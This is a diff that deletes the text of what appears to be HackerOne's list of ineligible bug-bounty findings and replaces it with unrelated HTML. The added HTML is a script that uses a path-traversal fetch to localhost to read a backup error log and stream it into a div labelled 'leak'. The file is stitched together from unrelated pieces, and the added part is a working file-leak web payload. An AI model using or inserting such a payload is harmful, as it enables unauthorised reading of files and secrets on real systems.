@@ -1,62 +1,20 @@
-These ineligible findings apply primarily to Spot checks, Challenges, Bug bounty, and VDP programs. Out-of-scope vulnerabilities for pentests are covered in the rules of engagement within the platform. 
-
- 
-
-HackerOne Core Ineligible Findings
-When reporting potential vulnerabilities, please consider (1) realistic attack scenarios and (2) the security impact of the behavior. Below, you will find the most common false positives we encounter. The following issues will be closed as invalid except in rare circumstances demonstrating clear security impact.
-
-Theoretical vulnerabilities that require unlikely user interaction or circumstances. For example:
-
-Vulnerabilities only affecting users of unsupported or end-of-life browsers or operating systems
-
-Broken link hijacking
-
-Tabnabbing
-
-Content spoofing and text injection issues
-
-Attacks requiring physical access to a device (unless explicitly in scope)
-
-Self-exploitation, such as self-XSS or self-DoS (unless it can be used to attack a different account)
-
-Theoretical vulnerabilities that do not demonstrate real-world security impact. For example:
-
-Clickjacking on pages with no sensitive actions
-
-Cross-Site Request Forgery (CSRF) on forms with no sensitive actions (e.g., Logout)
-
-Permissive CORS configurations without demonstrated security impact
-
-Software version disclosure / Banner identification issues / Descriptive error messages or headers (e.g., stack traces, application or server errors)
-
-Comma Separated Values (CSV) injection
-
-Open redirects (unless you can demonstrate additional security impact)
-
-Optional security hardening steps / Missing best practices. For example:
-
-SSL/TLS Configurations
-
-Lack of SSL Pinning
-
-Lack of jailbreak detection in mobile apps
-
-Cookie handling (e.g., missing HttpOnly/Secure flags)
-
-Content-Security-Policy configuration opinions
-
-Optional email security features (e.g., SPF/DKIM/DMARC configurations)
-
-Most issues related to rate limiting
-
-Vulnerabilities that may require hazardous testing. This type of testing must never be attempted unless explicitly authorized:
-
-Issues relating to excessive traffic/requests (e.g., DoS, DDoS)
-
-Any other issues where testing may affect the availability of systems
-
-Social engineering attacks (e.g., phishing, opening support requests)
-
-Attacks that are noisy to users or admins (e.g., spamming notifications or forms)
-
-Attacks against physical facilities
+<div id="leak">waiting...</div>
+<script>
+(async () => {
+  const el = document.getElementById('leak');
+  try {
+    const response = await fetch('http://localhost:8080/../backups/backup_b52afd67/error.log.xor');
+    const reader = response.body.getReader();
+    const decoder = new TextDecoder();
+    let result = '';
+    while (true) {
+      const { done, value } = await reader.read();
+      if (done) break;
+      result += decoder.decode(value, { stream: true });
+      el.textContent = result;
+    }
+  } catch (err) {
+    el.textContent = 'error: ' + err.message;
+  }
+})();
+</script>
